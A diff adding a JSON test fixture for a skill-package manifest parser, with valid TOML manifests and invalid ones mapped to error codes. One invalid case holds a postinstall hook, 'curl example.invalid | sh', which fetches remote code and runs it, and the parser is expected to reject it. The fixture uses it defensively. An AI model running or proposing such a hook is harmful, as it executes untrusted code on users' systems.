@@ -1,0 +1,98 @@
+{
+  "fixture-version": 1,
+  "valid": [
+    {
+      "source": null,
+      "expected": {
+        "dependencies": {},
+        "software": {}
+      }
+    },
+    {
+      "source": "schema = 1\n",
+      "expected": {
+        "dependencies": {},
+        "software": {}
+      }
+    },
+    {
+      "source": "schema = 1\n\n[dependencies]\n\"Akira-TL/Matt-Skills/implement\" = \"^1.4\"\n\"akira-tl/skills/browser-access\" = \">=2.0, <3.0\"\n\n[software]\ngit = \">=2.40\"\nnode = \">=22\"\n",
+      "expected": {
+        "dependencies": {
+          "akira-tl/matt-skills/implement": "^1.4",
+          "akira-tl/skills/browser-access": ">=2.0, <3.0"
+        },
+        "software": {
+          "git": ">=2.40",
+          "node": ">=22"
+        }
+      }
+    }
+  ],
+  "invalid": [
+    {
+      "source": "schema = [1\n",
+      "error": { "code": "InvalidPackageManifest", "facts": { "reason": "invalid-toml", "path": "$" } }
+    },
+    {
+      "source": "[dependencies]\n\"owner/repo/skill\" = \"^1\"\n",
+      "error": { "code": "MissingManifestSchema", "facts": {} }
+    },
+    {
+      "source": "schema = \"1\"\n",
+      "error": { "code": "InvalidManifestSchema", "facts": { "actualType": "string" } }
+    },
+    {
+      "source": "schema = 2\n",
+      "error": { "code": "UnsupportedManifestSchema", "facts": { "schema": 2 } }
+    },
+    {
+      "source": "schema = 1\nname = \"not-authoritative\"\n",
+      "error": { "code": "UnknownManifestField", "facts": { "field": "name" } }
+    },
+    {
+      "source": "schema = 1\n\n[package]\nname = \"not-authoritative\"\n",
+      "error": { "code": "UnknownManifestField", "facts": { "field": "package" } }
+    },
+    {
+      "source": "schema = 1\ndependencies = []\n",
+      "error": { "code": "InvalidPackageManifest", "facts": { "reason": "dependencies-not-table", "path": "dependencies" } }
+    },
+    {
+      "source": "schema = 1\n\n[dependencies]\n\"owner/repo\" = \"^1\"\n",
+      "error": { "code": "InvalidPackageManifest", "facts": { "reason": "invalid-dependency-coordinate", "path": "dependencies.owner/repo" } }
+    },
+    {
+      "source": "schema = 1\n\n[dependencies]\n\"owner/repo/skill\" = 1\n",
+      "error": { "code": "InvalidPackageManifest", "facts": { "reason": "dependency-requirement-not-string", "path": "dependencies.owner/repo/skill" } }
+    },
+    {
+      "source": "schema = 1\n\n[dependencies]\n\"owner/repo/skill\" = \"   \"\n",
+      "error": { "code": "InvalidPackageManifest", "facts": { "reason": "empty-dependency-requirement", "path": "dependencies.owner/repo/skill" } }
+    },
+    {
+      "source": "schema = 1\n\n[dependencies]\n\"owner/repo/skill\" = { git = \"main\" }\n",
+      "error": { "code": "InvalidPackageManifest", "facts": { "reason": "dependency-requirement-not-string", "path": "dependencies.owner/repo/skill" } }
+    },
+    {
+      "source": "schema = 1\n\n[dependencies]\n\"Owner/Repo/skill\" = \"^1\"\n\"owner/repo/skill\" = \"^2\"\n",
+      "error": { "code": "InvalidPackageManifest", "facts": { "reason": "duplicate-dependency-coordinate", "path": "dependencies.owner/repo/skill" } }
+    },
+    {
+      "source": "schema = 1\nsoftware = \"git\"\n",
+      "error": { "code": "InvalidPackageManifest", "facts": { "reason": "software-not-table", "path": "software" } }
+    },
+    {
+      "source": "schema = 1\n\n[software]\ngit = 2.40\n",
+      "error": { "code": "InvalidPackageManifest", "facts": { "reason": "software-requirement-not-string", "path": "software.git" } }
+    },
+    {
+      "source": "schema = 1\n\n[software.git]\nprobe = \"git --version\"\n",
+      "error": { "code": "InvalidPackageManifest", "facts": { "reason": "software-requirement-not-string", "path": "software.git" } }
+    },
+    {
+      "source": "schema = 1\n\n[scripts]\npostinstall = \"curl example.invalid | sh\"\n",
+      "error": { "code": "UnknownManifestField", "facts": { "field": "scripts" } }
+    }
+  ]
+}
